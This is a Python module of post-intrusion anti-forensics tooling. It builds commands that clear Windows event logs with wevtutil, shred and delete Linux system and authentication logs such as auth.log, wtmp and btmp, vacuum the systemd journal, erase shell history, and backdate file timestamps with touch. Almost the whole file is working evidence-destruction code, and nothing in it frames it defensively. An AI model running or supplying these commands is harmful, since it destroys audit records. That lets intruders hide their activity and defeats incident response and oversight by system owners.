LOG_PATHS = {
    "windows": {
        "security": "wevtutil cl Security",
        "system": "wevtutil cl System",
        "application": "wevtutil cl Application",
        "powershell": "wevtutil cl 'Windows PowerShell'",
        "powershell_op": "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
    },
    "linux": {
        "syslog": "shred -z /var/log/syslog 2>/dev/null; rm -f /var/log/syslog",
        "auth": "shred -z /var/log/auth.log 2>/dev/null; rm -f /var/log/auth.log",
        "kern": "shred -z /var/log/kern.log 2>/dev/null; rm -f /var/log/kern.log",
        "lastlog": "shred -z /var/log/lastlog 2>/dev/null; rm -f /var/log/lastlog",
        "wtmp": "shred -z /var/log/wtmp 2>/dev/null; rm -f /var/log/wtmp",
        "btmp": "shred -z /var/log/btmp 2>/dev/null; rm -f /var/log/btmp",
        "messages": "shred -z /var/log/messages 2>/dev/null; rm -f /var/log/messages",
        "journal": "journalctl --rotate && journalctl --vacuum-time=1s 2>/dev/null",
    },
}


def get_wipe_commands(platform: str = "linux", targeted: list[str] = None) -> list[str]:
    logs = LOG_PATHS.get(platform, {})
    if targeted:
        return [v for k, v in logs.items() if k in targeted]
    return list(logs.values())


def wipe_script(platform: str = "linux", exclude: list[str] = None) -> str:
    commands = get_wipe_commands(platform)
    if exclude:
        commands = [c for c in commands if not any(e in c for e in exclude)]
    script = ""
    for cmd in commands:
        if platform == "linux":
            script += f"if command -v {' '.join(cmd.split()[:1])} 2>/dev/null; then {cmd}; fi\n"
        else:
            script += f"{cmd} 2>$null\n"
    return script


def timestamp_jammer(target_file: str = "", new_ts: str = "") -> str:
    if not target_file:
        return ""
    import random
    import datetime
    ts = new_ts or datetime.datetime.now().strftime("%Y%m%d%H%M.%S")
    return f"touch -t {ts} {target_file}"


def event_log_wipe_recon(platform: str = "windows") -> str:
    if platform == "windows":
        return (
            '@( "Security", "System", "Application", "Windows PowerShell", '
            '"Microsoft-Windows-PowerShell/Operational", '
            '"Microsoft-Windows-WMI-Activity/Operational", "Setup" ) | '
            'ForEach-Object { wevtutil cl $_ 2>$null }'
        )
    return (
        'for log in syslog auth.log kern.log lastlog wtmp btmp messages; do '
        'shred -z /var/log/$log 2>/dev/null; rm -f /var/log/$log; done; '
        'journalctl --rotate --vacuum-time=1s 2>/dev/null; '
        'rm -rf ~/.bash_history ~/.zsh_history 2>/dev/null; '
        'history -c 2>/dev/null'
    )
